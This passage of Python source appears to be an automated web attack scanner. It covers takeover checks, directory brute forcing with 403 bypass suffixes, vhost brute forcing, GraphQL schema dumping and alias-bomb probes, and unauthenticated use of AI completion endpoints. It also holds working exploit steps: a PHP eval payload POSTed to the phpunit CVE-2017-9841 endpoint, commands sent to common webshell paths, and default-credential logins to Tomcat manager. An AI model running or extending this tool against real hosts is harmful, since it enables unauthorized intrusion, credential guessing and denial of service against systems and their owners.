                        for jp in juicy[:3]:
                            keep = False
                            for sch2 in ("https", "http"):
                                try:
                                    async with HTTP_SEM:
                                        async with session.get(
                                                f"{sch2}://{host}{jp}",
                                                headers=UA,
                                                timeout=aiohttp.ClientTimeout(
                                                    total=6),
                                                ssl=False,
                                                allow_redirects=False) as cr:
                                            st2 = cr.status
                                            b2 = await cr.content.read(8000)
                                except Exception:
                                    continue
                                if st2 is None:
                                    continue
                                if st2 in (404, 410, 400):
                                    break            # definitively absent
                                if st2 == 200:
                                    if not ctrl_done:
                                        ctrl_done = True
                                        try:
                                            async with HTTP_SEM:
                                                async with session.get(
                                                        f"{sch2}://{host}"
                                                        f"/sxe-rl-"
                                                        f"{os.urandom(3).hex()}",
                                                        headers=UA,
                                                        timeout=aiohttp.
                                                        ClientTimeout(total=6),
                                                        ssl=False,
                                                        allow_redirects=False) as xr:
                                                    ctrl = (xr.status,
                                                            await xr.content.read(8000))
                                        except Exception:
                                            ctrl = None
                                    if ctrl and ctrl[0] == 200 and \
                                            _body_similar(ctrl[1], b2):
                                        break    # catch-all soft-404
                                keep = True
                                break
                            if keep:
                                conf.append(jp)
                        if conf:
                            findings.append(
                                f"[ROBOTS-LEAK] {host}/robots.txt disallows "
                                f"{' , '.join(conf)} - hidden paths confirmed "
                                f"live on this host ('disallowed' != "
                                f"'protected')")
                        break
        except Exception:
            continue
    for p in SENS_FILES:
        for scheme in ("https", "http"):
            try:
                async with HTTP_SEM:
                    async with session.get(f"{scheme}://{host}{p}", headers=UA,
                                           timeout=aiohttp.ClientTimeout(total=6),
                                           ssl=False, allow_redirects=False) as r:
                        if r.status != 200:
                            continue
                        body = await r.content.read(200_000)
                        if leak_ok(p, body):
                            if p == "/.DS_Store":
                                names = dsstore_names(body)
                                if len(names) >= 3:
                                    findings.append(
                                        f"[DSSTORE] {scheme}://{host}{p} parses - "
                                        f"{len(names)} dir entries leaked (e.g. "
                                        f"{', '.join(names[:5])})")
                                    break
                            _spec = SENS_TAG.get(p)
                            if _spec:
                                findings.append(
                                    f"[{_spec[0]}] {scheme}://{host}{p} {_spec[1]}")
                            else:
                                findings.append(
                                    f"[LEAK] {scheme}://{host}{p} (200, {len(body)}B)")
                        break
            except Exception:
                continue
    # phpunit eval-stdin (CVE-2017-9841): the endpoint evals the raw POST
    # body - executing our marker proves unauthenticated RCE
    for p in ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
              "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"):
        done = False
        for scheme in ("https", "http"):
            if done:
                break
            try:
                async with HTTP_SEM:
                    async with session.post(
                            f"{scheme}://{host}{p}", headers=UA,
                            data=b'<?php echo "sxeRceOk7"; ?>',
                            timeout=aiohttp.ClientTimeout(total=6),
                            ssl=False, allow_redirects=False) as r:
                        if r.status == 200 and b"sxeRceOk7" in (
                                await r.content.read(8000)):
                            findings.append(
                                f"[PHPUNIT-RCE] {scheme}://{host}{p} evals "
                                f"the POST body (CVE-2017-9841) - "
                                f"unauthenticated remote code execution")
                            done = True
            except Exception:
                continue
    # webshell files: a live shell echoes our canary command output - the
    # strongest possible evidence (command actually executed)
    for p in ("/cmd.php", "/shell.php", "/wso.php", "/webshell.php",
              "/backdoor.php", "/c99.php"):
        done = False
        for scheme in ("https", "http"):
            if done:
                break
            try:
                async with HTTP_SEM:
                    async with session.get(
                            f"{scheme}://{host}{p}?cmd=echo+sxeShell77",
                            headers=UA, timeout=aiohttp.ClientTimeout(total=6),
                            ssl=False, allow_redirects=False) as r:
                        if r.status == 200 and b"sxeShell77" in (
                                await r.content.read(8000)):
                            findings.append(
                                f"[SHELL-EXEC] {scheme}://{host}{p} executes "
                                f"shell commands (canary echoed) - live "
                                f"webshell, host is owned")
                            done = True
            except Exception:
                continue
    # tomcat manager default creds: a200 manager page behind basic auth
    # with a factory-default pair = unauthenticated code deploy
    done = False
    for user, pw in (("admin", "admin"), ("tomcat", "s3cret"),
                     ("admin", "s3cret"), ("tomcat", "tomcat")):
        if done:
            break
        auth = aiohttp.BasicAuth(user, pw)
        for scheme in ("https", "http"):
            if done:
                break
            try:
                async with HTTP_SEM:
                    async with session.get(
                            f"{scheme}://{host}/manager/html",
                            headers=UA, auth=auth,
                            timeout=aiohttp.ClientTimeout(total=6),
                            ssl=False, allow_redirects=False) as r:
                        if r.status != 200:
                            continue
                        body = await r.content.read(60_000)
                        if (b"Tomcat Web Application Manager" in body
                                or b"Manager App" in body):
                            findings.append(
                                f"[TOMCAT-DEFAULT] {scheme}://{host}"
                                f"/manager/html accepts default creds "
                                f"{user}:{pw} - unauthenticated WAR deploy "
                                f"is remote code execution")
                            done = True
            except Exception:
                continue


# ---------------- phase 10: takeover ----------------
async def takeover_confirm(dangling, probes, findings):
    async with tsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:
        for h in sorted(dangling):
            info = probes.get(h, {})
            # always refetch fresh: the probe body may predate the DNS
            # change or a WAF serving a different page now - probe body is
            # only a fallback when the live fetch fails
            body = b""
            for scheme in ("https", "http"):
                body = await fetch_blob(s, f"{scheme}://{h}/", 10, HTTP_SEM,
                                        100_000) or b""
                if body:
                    break
            if not body:
                body = info.get("body") or b""
            name = fp_match(body)
            dn = str(dangling[h]).lower()
            # body text can be shared by two services ("project not found"
            # belongs to both surge.sh and readme.io) - when the CNAME chain
            # end names a service whose patterns match, trust that name (even
            # a GENERIC one: the DNS chain is the disambiguating evidence)
            implied = False
            for k, pats in TAKEOVER.items():
                if k.lower() in dn and any(p.lower() in body.lower()
                                           for p in pats):
                    name, implied = k, True
                    break
            if name and (implied or name not in GENERIC_FP):
                findings.append(f"[TAKEOVER-CONFIRMED] {h} -> {dangling[h]} matches {name} fingerprint")
            else:
                findings.append(f"[TAKEOVER-DANGLING] {h} -> {dangling[h]} (verify manually)")


# ---------------- shared http helper for phases 11-14 ----------------
async def _grab(session, url, timeout=6, method="GET", headers=None, data=None,
                redirects=False, limit=12000, check_throttle=True):
    """returns (status, body, headers); status None on error."""
    async with HTTP_SEM:
        if check_throttle and fetch_throttled(url):
            # host is in 429/503 backoff: bulk scans skip the wave instead
            # of sleeping it out (matches fetch/fetch_blob semantics)
            return None, b"", {}
        try:
            async with session.request(method, url, headers={**UA, **(headers or {})},
                                       data=data, timeout=aiohttp.ClientTimeout(total=timeout),
                                       ssl=False, allow_redirects=redirects) as r:
                body = await r.content.read(limit)
                return r.status, body, dict(r.headers)
        except Exception:
            return None, b"", {}


def _burl(probes, h):
    return f"{probes.get(h, {}).get('scheme') or 'https'}://{h}"


# ---------------- phase 11: content discovery ----------------
def _loc_path(hdr):
    loc = hdr.get("location") or hdr.get("Location") or ""
    if not loc:
        return ""
    if "://" not in loc and not loc.startswith("/"):
        loc = "/" + loc
    return urlsplit(loc).path


def dirlist_hit(body):
    """structural directory-listing markers (Apache/nginx title, IIS parent
       block, python http.server) - not a bare 200."""
    if not body:
        return False
    b = body[:30000].lower()
    return (b"<title>index of /" in b or b"<h1>index of /" in b
            or b"[to parent directory]" in b or b"directory listing for /" in b)


async def content_discovery(probes, findings, dir_paths, cap_hosts=120):
    rows = []
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    if not targets or not dir_paths:
        return rows
    rng = os.urandom(4).hex()
    bpath = f"/subenum-nope-{rng}"           # extensionless: matches most probed paths
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        bases = {}

        async def get_base(h):
            base = _burl(probes, h)
            bst, bbody, bhd = await _grab(s, f"{base}{bpath}", timeout=4)
            if bst is None:
                return
            bloc = _loc_path(bhd)
            b_echo = bool(bloc) and bloc.rstrip("/") == bpath.rstrip("/")
            bases[h] = (base, bst, len(bbody), bbody[:200], b_echo, bloc)

        await asyncio.gather(*[get_base(h) for h in targets])

        REDIR = (301, 302, 303, 307, 308)
        byp_used = {}

        async def check(h, p):
            base, bst, blen, bpref, b_echo, bloc = bases[h]
            if probes[h].get("waf"):
                await asyncio.sleep(0.12)      # WAF hosts: pace requests, avoid 429
            url = f"{base}/{p}"
            st, body, hd = await _grab(s, url, timeout=4)
            if st is None:
                return
            if st not in (200, 201, 301, 302, 303, 307, 308,
                          401, 403, 405, 500, 503):
                return
            if st in REDIR:
                loc = _loc_path(hd)
                selfr = bool(loc) and loc.rstrip("/") == f"/{p}".rstrip("/")
                if (selfr and b_echo) or (bloc and loc and loc == bloc):
                    return                # generic/site-wide redirect, baseline too
            elif st == bst and body[:200] == bpref:
                return                    # soft-404 (prefix reliable; body len varies)
            st2, body2, hd2 = await _grab(s, url, timeout=4)
            if st2 != st:
                return                    # flaky response, untrustworthy
            if st in REDIR:
                loc2 = _loc_path(hd2)
                if (selfr and b_echo) or (bloc and loc2 and loc2 == bloc) \
                        or loc2 != loc:
                    return
                turl = urljoin(url, loc)
                tst, tbody, _ = await _grab(s, turl, timeout=4)
                if tst is None or tst not in (200, 201, 401, 403, 405, 500, 503):
                    return                # dead/redirecting target: boring
                if tst == bst and tbody[:200] == bpref:
                    return                # target is the soft-404/catch-all page
            else:
                if st == bst and body2[:200] == bpref:
                    return                # transient soft-404 variant
                if body2[:200] != body[:200]:
                    return                # unstable page, can't trust
            ln = len(body)
            tag = ("DIR-CRIT" if p in DIR_CRIT
                   else "DIR-HOT" if DIR_HOT_RE.search(p) else "DIR")
            if st == 403 and tag == "DIR-CRIT":
                tag = "DIR-HOT"           # forbidden != confirmed leak
            extra = f" -> {loc}" if st in REDIR and loc else ""
            findings.append(f"[{tag}] {h}/{p} ({st}, {ln}B){extra}")
            if st == 200 and dirlist_hit(body):
                findings.append(f"[DIRLIST] {h}/{p} directory listing enabled ({ln}B)")
            rows.append(f"{h}\t{st}\t{ln}\t/{p}")
            # 403 on a juicy path: try known path-variant bypasses; only a
            # stable 200 whose body differs from both the 403 page and the
            # catch-all baseline counts as evidence
            if st == 403 and tag in ("DIR-HOT", "DIR-CRIT") \
                    and byp_used.get(h, 0) < 6:
                byp_used[h] = byp_used.get(h, 0) + 1
                for suf in ("/.", "%20", ";", "//", "%09", "/..;"):
                    stv, bv, _ = await _grab(s, f"{base}/{p}{suf}", timeout=4)
                    if stv != 200 or len(bv) < 80 or _body_similar(bv, body):
                        continue
                    if bv[:200] == bpref:
                        continue            # catch-all/soft-404 page, not content
                    stv2, bv2, _ = await _grab(s, f"{base}/{p}{suf}", timeout=4)
                    if stv2 == 200 and bv2[:200] == bv[:200]:
                        findings.append(
                            f"[PATH-BYPASS] {h}/{p} 403 bypassed via {suf!r} "
                            f"suffix (200, {len(bv)}B) - access control "
                            f"enforced only at the edge")
                        break

        jobs = [check(h, p) for h in bases for p in dir_paths]
        done = 0
        for coro in asyncio.as_completed(jobs):
            try:
                await coro
            except Exception as e:
                note_check_error("dirs", f"failed: {e}")
            done += 1
            if done % 2000 == 0:
                print(f"  [dirs] {done}/{len(jobs)} checks, {len(rows)} hits", flush=True)
    print(f"  [dirs] -> {len(rows)} interesting paths on {len(bases)} hosts "
          f"({len(dir_paths)} paths)", flush=True)
    return rows


# ---------------- phase 12: vhost brute ----------------
def _same_resp(a, b):
    """two responses considered 'the same page' (accepts (st, body) or (st, body, hdrs))."""
    sa, ba = a[0], a[1]
    sb, bb = b[0], b[1]
    if sa != sb:
        return False
    if abs(len(ba) - len(bb)) > max(96, int(max(len(ba), len(bb)) * 0.15)):
        return False
    return ba[:400] == bb[:400]


async def vhost_brute(probes, live, domains, words, findings, cap_words=150):
    rows = []
    ip_map = {}
    for h, ips in sorted(live.items()):
        if h in probes and probes[h].get("status"):
            ip_map.setdefault(ips[0], []).append(h)
    shared = [kv for kv in sorted(ip_map.items(), key=lambda kv: -len(kv[1]))
              if len(kv[1]) >= 2][:30]
    if not shared:
        print("  [vhost] no shared-IP targets", flush=True)
        return rows
    cands, seen = [], set()
    for w in words[:cap_words]:
        for d in domains:
            c = f"{w}.{d}"
            if c not in seen and c not in live:
                seen.add(c)
                cands.append(c)
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        checks = []
        for ip, hs in shared:
            scheme = probes.get(hs[0], {}).get("scheme") or "https"

            async def base_sample(sc):
                rnd_host = f"subenum-nope-{os.urandom(3).hex()}.{domains[0]}"
                st, body, hd = await _grab(s, f"{sc}://{ip}/", headers={"Host": rnd_host},
                                           timeout=5)
                return st, body, {k.lower(): v for k, v in hd.items()}

            samples, hd = [], {}
            for _ in range(3):
                st, body, h = await base_sample(scheme)
                if st is None and not samples:
                    scheme = "http" if scheme == "https" else "https"
                    st, body, h = await base_sample(scheme)
                if st is None:
                    break
                samples.append((st, body))
                if not hd:
                    hd = h
            if len(samples) < 2:
                continue
            if "cf-ray" in hd or "cloudflare" in hd.get("server", "").lower():
                continue                                      # CF anycast: Host routing is trivial
            if not all(_same_resp(samples[0], x) for x in samples[1:]):
                print(f"  [vhost] {ip} skipped (dynamic default response)", flush=True)
                continue
            checks.append((ip, scheme, samples[0][0], len(samples[0][1]),
                           samples[0][1][:400]))
        if not checks:
            print("  [vhost] -> 0 vhost hits", flush=True)
            return rows
        total, done = len(checks) * len(cands), [0]

        async def one(ip, scheme, bstat, blen, bpref, cand):
            a = await _grab(s, f"{scheme}://{ip}/", headers={"Host": cand}, timeout=5)
            done[0] += 1
            if done[0] % 1000 == 0:
                print(f"  [vhost] {done[0]}/{total}", flush=True)
            st, body = a[0], a[1]
            if st is None or st not in (200, 201, 301, 302, 401, 403, 500):
                return
            if (st == bstat and abs(len(body) - blen) <= max(96, int(blen * 0.15))
                    and body[:400] == bpref):
                return                                        # same as default vhost
            b = await _grab(s, f"{scheme}://{ip}/", headers={"Host": cand}, timeout=5)
            if b[0] is None or not _same_resp(a, (b[0], b[1])):
                return                                        # unstable -> dynamic backend
            prev = body[:200].lower()
            defaultish = any(x in prev for x in (b"default page", b"welcome to nginx",
                                                  b"iis windows", b"apache2 ubuntu",
                                                  b"it works!", b"coming soon"))
            tag = "VHOST-DEFAULT" if defaultish else "VHOST"
            findings.append(f"[{tag}] {scheme}://{ip}/ Host:{cand} ({st}, {len(body)}B)")
            rows.append(f"{ip}\t{cand}\t{scheme}\t{st}\t{len(body)}")

        await asyncio.gather(*[one(ip, scheme, bstat, blen, bpref, c)
                                for ip, scheme, bstat, blen, bpref in checks
                                for c in cands])
    print(f"  [vhost] -> {len(rows)} vhost hits "
          f"({len(checks)} shared IPs x {len(cands)} names)", flush=True)
    return rows


# ---------------- phase 13: api spec + graphql ----------------
FULL_INTROSPECT = (b'{"query":"{__schema{queryType{name} mutationType{name} '
                   b'types{name kind fields{name}}}}"}')


def gql_schema_stats(body):
    """(query fields, mutation fields, dangerous field names) from introspection JSON.

    dangerous names are only counted on the ROOT types (queryType /
    mutationType): those are the actually-invocable entry points. a
    `password` column on a User object type is data shape, not a callable
    write - calling it out would be an FP."""
    try:
        if isinstance(body, (bytes, bytearray)):
            body = body.decode("utf-8", "ignore")
        schema = ((json.loads(body) or {}).get("data") or {}).get("__schema") or {}
        def nfields(key):
            return len((schema.get(key) or {}).get("fields") or [])
        danger = []
        roots = {((schema.get(k) or {}).get("name"))
                 for k in ("queryType", "mutationType")} - {None}
        if roots:
            for t in schema.get("types") or []:
                if t.get("name") not in roots:
                    continue
                for fld in t.get("fields") or []:
                    nm = (fld.get("name") or "").lower()
                    if any(k in nm for k in ("delete", "drop", "remove", "admin",
                                             "password", "reset", "exec", "runsql",
                                             "upload", "impersonate", "grant")):
                        danger.append(fld.get("name"))
        return nfields("queryType"), nfields("mutationType"), sorted(set(danger))
    except Exception:
        return 0, 0, []


def _gql_schema(body):
    """parsed data.__schema from an introspection response; None when absent.

    an echo of our own query is valid JSON and contains `__schema`, but never
    carries an execution-shaped `data.__schema` object - so echoing servers,
    200 HTML and error pages all resolve to None (no-FP gate)."""
    try:
        if isinstance(body, (bytes, bytearray)):
            body = body.decode("utf-8", "ignore")
        j = json.loads(body or "")
        sch = ((j or {}).get("data") or {}).get("__schema")
        return sch if isinstance(sch, dict) else None
    except Exception:
        return None


DUMP_PATHS = ("/api/users", "/api/v1/users", "/users.json", "/api/customers",
              "/api/accounts", "/api/orders", "/api/members")
DUMP_IDKEYS = (b"email", b"username", b"phone", b"login", b"fullname", b"full_name")


async def api_spec(probes, findings, cap_hosts=150, schema_out=""):
    rows, schemas = [], []
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    if not targets:
        return rows
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        async def one(h):
            base = _burl(probes, h)
            bl_body, bl_checked = None, False
            for p in SPEC_PATHS:
                st, body, _ = await _grab(s, f"{base}{p}", timeout=6, limit=20000)
                if st != 200 or len(body) < 24:
                    continue
                low = body[:6000].lower().lstrip()
                if (b"swagger" in low or b"openapi" in low or b"redoc" in low
                        or (low[:1] in (b"{", b"[") and b"paths" in low)):
                    # soft-404: a SPA catch-all serving one body for every
                    # path would mark every spec path as a hit - compare
                    # once against a random path of THIS host; a FAILED
                    # baseline fetch must not open the gate (sticky hole:
                    # bl_body stays None and every later path claimed)
                    if not bl_checked:
                        bl_checked = True
                        _bst, bl_body, _ = await _grab(
                            s, f"{base}/sxe-nospec-{os.urandom(4).hex()}",
                            timeout=6, limit=20000)
                        if not bl_body:
                            _bst, bl_body, _ = await _grab(
                                s, f"{base}/sxe-nospec-{os.urandom(4).hex()}",
                                timeout=6, limit=20000)
                    if not bl_body:
                        continue    # no baseline available: never claim
                    if _body_similar(bl_body, body):
                        continue
                    findings.append(f"[API-SPEC] {h}{p} ({st}, {len(body)}B)")
                    rows.append(f"{h}\t{p}\tspec\t{st}\t{len(body)}")
            # JSON record dumps: a list of record objects carrying identity
            # fields is data exposure regardless of the path name - content
            # proves it, and a random-path baseline proves the body is
            # really path-specific (SPA catch-alls never claim)
            dmp_bl = None
            for p in DUMP_PATHS:
                st, body, _ = await _grab(s, f"{base}{p}", timeout=6,
                                          limit=60000)
                if st != 200 or not body or body[:1] != b"[":
                    continue
                lb = body.lower()
                if not any(k in lb for k in DUMP_IDKEYS):
                    continue
                try:
                    data = json.loads(body)
                except Exception:
                    continue
                if (not isinstance(data, list) or len(data) < 2
                        or not isinstance(data[0], dict)):
                    continue
                if dmp_bl is None:
                    _bst, dmp_bl, _ = await _grab(
                        s, f"{base}/sxe-nodump-{os.urandom(4).hex()}",
                        timeout=6, limit=60000)
                if dmp_bl and _body_similar(dmp_bl, body):
                    continue
                findings.append(f"[API-DUMP] {h}{p} returns {len(data)} "
                                f"record(s) with identity fields "
                                f"unauthenticated - direct data exposure")
                rows.append(f"{h}\t{p}\tdump\t{st}\t{len(body)}")
            for p in GQL_PATHS:
                st, body, _ = await _grab(s, f"{base}{p}", timeout=6, limit=8000)
                if st == 200:
                    low = body[:4000].lower()
                    if any(x in low for x in (b"graphiql", b"graphql playground",
                                              b"altair", b"graphql-playground")):
                        findings.append(f"[GRAPHQL] {h}{p} interactive UI exposed ({st})")
                        rows.append(f"{h}\t{p}\tui\t{st}\t{len(body)}")
                pst, pb, _ = await _grab(
                    s, f"{base}{p}", method="POST",
                    headers={"Content-Type": "application/json"},
                    data=b'{"query":"{__schema{queryType{name}}}"}', timeout=6, limit=8000)
                sch = _gql_schema(pb) if pst == 200 else None
                if not (sch and (sch.get("queryType") or sch.get("types"))):
                    # introspection off: 'did you mean' suggestions still
                    # enumerate field names one probe at a time
                    sst, sb, _ = await _grab(
                        s, f"{base}{p}", method="POST",
                        headers={"Content-Type": "application/json"},
                        data=b'{"query":"{sxeNoSuchFieldXyz}"}', timeout=6,
                        limit=4000)
                    if sst == 200 and b"did you mean" in sb.lower():
                        findings.append(
                            f"[GQL-SUGGEST] {h}{p} suggests schema fields for "
                            f"unknown queries - schema enumerable without "
                            f"introspection")
                        rows.append(f"{h}\t{p}\tsuggest\t{sst}\t{len(sb)}")
                # query-cost DoS: a wide alias bomb needs no schema - a
                # server that 5xxs on 400 aliases while serving a 4-alias
                # control has no query cost limiting
                ctl_q = ('{"query":"{a0:__typename a1:__typename '
                         'a2:__typename a3:__typename}"}').encode()
                bomb_q = ('{"query":"{' + " ".join(
                    f"x{i}:__typename" for i in range(400)) + '}"}').encode()
                cst, cb, _ = await _grab(
                    s, f"{base}{p}", method="POST",
                    headers={"Content-Type": "application/json"},
                    data=ctl_q, timeout=8, limit=4000)
                if cst == 200:
                    bst, bb, _ = await _grab(
                        s, f"{base}{p}", method="POST",
                        headers={"Content-Type": "application/json"},
                        data=bomb_q, timeout=15, limit=4000)
                    if bst is not None and bst >= 500:
                        findings.append(
                            f"[GQL-COST] {h}{p} returns {bst} on a 400-alias "
                            f"query while the 4-alias control is 200 - no "
                            f"query cost/complexity limit (DoS)")
                        rows.append(f"{h}\t{p}\tcost\t{bst}\t{len(bb or b'')}")
                if sch is not None and (sch.get("queryType") or sch.get("types")):
                    findings.append(f"[GRAPHQL] {h}{p} introspection enabled (read-only query)")
                    rows.append(f"{h}\t{p}\tintrospection\t{pst}\t{len(pb)}")
                    fst, fb, _ = await _grab(
                        s, f"{base}{p}", method="POST",
                        headers={"Content-Type": "application/json"},
                        data=FULL_INTROSPECT, timeout=12, limit=3_000_000)
                    fsch = _gql_schema(fb) if fst == 200 else None
                    if fsch and fsch.get("types"):
                        nq, nm, danger = gql_schema_stats(fb)
                        findings.append(f"[GRAPHQL] {h}{p} full schema dumpable "
                                        f"({nq} query / {nm} mutation fields)")
                        rows.append(f"{h}\t{p}\tschema\t{fst}\t{len(fb)}")
                        if danger:
                            findings.append(f"[GQL-DANGEROUS] {h}{p} write/admin fields "
                                            f"exposed: {', '.join(danger[:8])}")
                        schemas.append((h, p, fb))
        await asyncio.gather(*[one(h) for h in targets])
    if schema_out and schemas:
        try:
            with open(schema_out, "w", encoding="utf-8") as f:
                for h, p, raw in schemas:
                    f.write(f"=== {h}{p} ===\n")
                    try:
                        types = (((json.loads(raw.decode("utf-8", "ignore")) or {})
                                  .get("data") or {}).get("__schema") or {}).get("types") or []
                        for t in types:
                            fn = [x.get("name") for x in (t.get("fields") or [])]
                            if fn:
                                f.write(f"{t.get('kind','?')} {t.get('name','?')}: "
                                        f"{', '.join(str(x) for x in fn)}\n")
                    except Exception:
                        f.write("(unparseable introspection payload)\n")
                    f.write("\n")
            print(f"  [api] -> graphql schema dump: {schema_out}", flush=True)
        except OSError as e:
            note_check_error("api", f"schema dump failed: {e}")
    print(f"  [api] -> {len(rows)} spec/graphql/dump hits", flush=True)
    return rows


# ---------------- wave 25: AI/LLM API surface ----------------
async def llm_surface_checks(probes, findings, cap_hosts=60):
    """prove an OpenAI-compatible API by response SHAPE, never by path:
    a model list needs object=list + data[].object=model records, an
    auth-gated claim needs an api-key error body, and unauthenticated
    inference (LLM-OPEN) needs a successful completion carrying usage
    tokens with a non-echo reply - a random-path baseline drops SPA /
    catch-all JSON servers, and a failed baseline claims nothing."""
    rows = []
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    if not targets:
        return rows
    prompt = "Reply with the single word OK only."
    pbytes = json.dumps({"model": "probe", "messages": [
        {"role": "user", "content": prompt}]}).encode()
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        async def one(h):
            base = _burl(probes, h)
            bl_body, bl_checked = None, False

            async def baseline(body):
                nonlocal bl_checked, bl_body
                if not bl_checked:
                    bl_checked = True
                    _bst, bl_body, _ = await _grab(
                        s, f"{base}/sxe-nollm-{os.urandom(4).hex()}",
                        timeout=6, limit=20000)
                    if not bl_body:
                        _bst, bl_body, _ = await _grab(
                            s, f"{base}/sxe-nollm-{os.urandom(4).hex()}",
                            timeout=6, limit=20000)
                if not bl_body:
                    return False    # no baseline: never claim
                return not _body_similar(bl_body, body)

            claimed = False
            for p in LLM_MODEL_PATHS:
                st, body, _ = await _grab(s, f"{base}{p}", timeout=6,
                                          limit=20000)
                if st != 200 or not body:
                    continue
                try:
                    j = json.loads(body)
                except Exception:
                    continue
                if not (isinstance(j, dict) and j.get("object") == "list"
                        and isinstance(j.get("data"), list) and j["data"]
                        and isinstance(j["data"][0], dict)
                        and j["data"][0].get("object") == "model"
                        and j["data"][0].get("id")):
                    continue
                if not await baseline(body):
                    continue
                ids = [str(m.get("id")) for m in j["data"][:3]
                       if isinstance(m, dict) and m.get("id")]
                findings.append(f"[LLM-ENDPOINT] {h}{p} serves an "
                                f"OpenAI-compatible model list ({st}, "
                                f"{len(body)}B: {', '.join(ids)})")
                rows.append(f"{h}\t{p}\tllm-models\t{st}\t{len(body)}")
                claimed = True
            st, body, _ = await _grab(s, f"{base}{LLM_COMPLETION}",
                                      method="POST", data=pbytes,
                                      headers={"Content-Type":
                                               "application/json"},
                                      timeout=8, limit=20000)
            if st in (200, 401, 403) and body and await baseline(body):
                try:
                    j = json.loads(body)
                except Exception:
                    j = None
                if (isinstance(j, dict) and st == 200
                        and isinstance(j.get("choices"), list)
                        and j["choices"] and isinstance(j["choices"][0], dict)
                        and isinstance(j["choices"][0].get("message"), dict)
                        and isinstance(j["choices"][0]["message"].get("content"),
                                       str)):
                    content = j["choices"][0]["message"]["content"].strip()
                    usage = (j.get("usage") if isinstance(j.get("usage"), dict)
                             else {})
                    toks = usage.get("total_tokens") or 0
                    try:
                        toks = int(toks)
                    except Exception:
                        toks = 0
                    if content and toks > 0 and content != prompt:
                        findings.append(
                            f"[LLM-OPEN] {h}{LLM_COMPLETION} accepted an "
                            f"unauthenticated completion ({st}, {len(body)}B, "
                            f"{toks} usage tokens, non-echo reply) - "
                            f"inference without any auth")
                        rows.append(f"{h}\t{LLM_COMPLETION}\tllm-open\t{st}\t"
                                    f"{len(body)}")
                        claimed = True
                elif (not claimed and st in (401, 403)
                      and isinstance(j, dict) and "error" in j
                      and any(k in body.lower() for k in (
                          b"api_key", b"apikey", b"authentication",
                          b"unauthorized", b"openai"))):
                    findings.append(f"[LLM-ENDPOINT] {h}{LLM_COMPLETION} is "
                                    f"an AI inference API ({st}: api-key "
                                    f"error, {len(body)}B)")
                    rows.append(f"{h}\t{LLM_COMPLETION}\tllm-gated\t{st}\t"
                                f"{len(body)}")
                    claimed = True
        res = await asyncio.gather(*(one(h) for h in targets),
                                   return_exceptions=True)
        errs = [r for r in res if isinstance(r, BaseException)]
        if errs:
            note_check_error("llm", f"{len(errs)} host(s) failed, "
                             f"first: {errs[0]!r}")
    print(f"  [llm] -> {len(rows)} AI endpoint hits", flush=True)
    return rows


# ---------------- phase 14: method matrix ----------------
async def method_matrix(probes, findings, cap_hosts=80):
    rows = []
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    if not targets:
        return rows
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        async def one(h):
            base = _burl(probes, h)
            tok = os.urandom(6).hex()
            # GET control first: a server that echoes ANY request headers on
            # every method (docs pages, debug echo) is not TRACE-enabled -
            # only a TRACE-specific echo counts
            gst, gbody, _ = await _grab(s, f"{base}/", method="GET",
                                        headers={"X-Sxe-Trace": tok},
                                        timeout=6, limit=4000)
            if gst == 200 and (tok.encode() in gbody
                               or b"X-SXE-TRACE" in gbody.upper()):
                st = None
            else:
                st, body, _ = await _grab(s, f"{base}/", method="TRACE",
                                          headers={"X-Sxe-Trace": tok},
                                          timeout=6, limit=4000)
            # evidence: OUR unique marker (or its header name) echoed - a
            # catch-all 200 page containing the hostname is not proof
            if st == 200 and (tok.encode() in body
                              or b"X-SXE-TRACE" in body.upper()):
                findings.append(f"[TRACE] {h} TRACE echoes request headers "
                                f"(XST: cross-site trace steals tokens)")
                rows.append(f"{h}\tTRACE\t{st}")
            st, body, _ = await _grab(s, f"{base}/", method="PROPFIND",
                                      headers={"Depth": "0", "Content-Type": "application/xml"},
                                      data=b'<?xml version="1.0"?>'
                                           b'<a:propfind xmlns:a="DAV:"><a:allprop/></a:propfind>',
                                      timeout=6, limit=4000)
            if st in (200, 201, 207) and (b"multistatus" in body.lower()
                                          or b"<d:response" in body.lower()):
                findings.append(f"[WEBDAV] {h} PROPFIND {st} -> WebDAV enabled")
                rows.append(f"{h}\tPROPFIND\t{st}")
            if probes[h].get("scheme") != "https":
                st, _, hd = await _grab(s, f"{base}/", method="OPTIONS", timeout=6, limit=1000)
                allow = ""
                for k, v in hd.items():
                    if k.lower() == "allow":
                        allow = v.upper()
                        break
                if st and allow:
                    bad = [m for m in DANGEROUS_METHODS if m in allow]
                    if bad:
                        findings.append(f"[METHODS] {h} allows {','.join(bad)} "
                                        f"(Allow: {allow[:60]})")
                        rows.append(f"{h}\tOPTIONS\t{allow[:80]}")
        await asyncio.gather(*[one(h) for h in targets])
    print(f"  [methods] -> {len(rows)} hits", flush=True)
    return rows


async def put_delete_checks(probes, findings, cap_hosts=20):
    """canary write checks: PUT a unique file, verify persistence via GET,
    then DELETE it with verified removal.

    evidence rules - PUT-ALLOWED needs a 2xx PUT AND a GET returning the
    canary body (a WAF/SPA 200 page alone is never persistence); DELETE-
    ALLOWED needs verified removal of that canary. 405/403/401 or any 2xx
    without persistence = no finding. runs anonymously (xsession: no target
    auth headers) so the finding proves unauthenticated write access."""
    targets = [h for h in sorted(probes)
               if probes[h].get("status")][:cap_hosts]
    if not targets:
        return 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    rows = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal rows
            base = _burl(probes, h)
            tok = os.urandom(4).hex()
            path = f"/sxe-put-{tok}.txt"
            blob = f"sxe-canary-{tok}".encode()
            url = f"{base}{path}"
            st, _, _ = await _grab(s, url, method="PUT", data=blob,
                                   headers={"Content-Type": "text/plain"},
                                   timeout=8, limit=2000)
            if st not in (200, 201, 202, 204):
                return                    # disabled / auth-walled / error
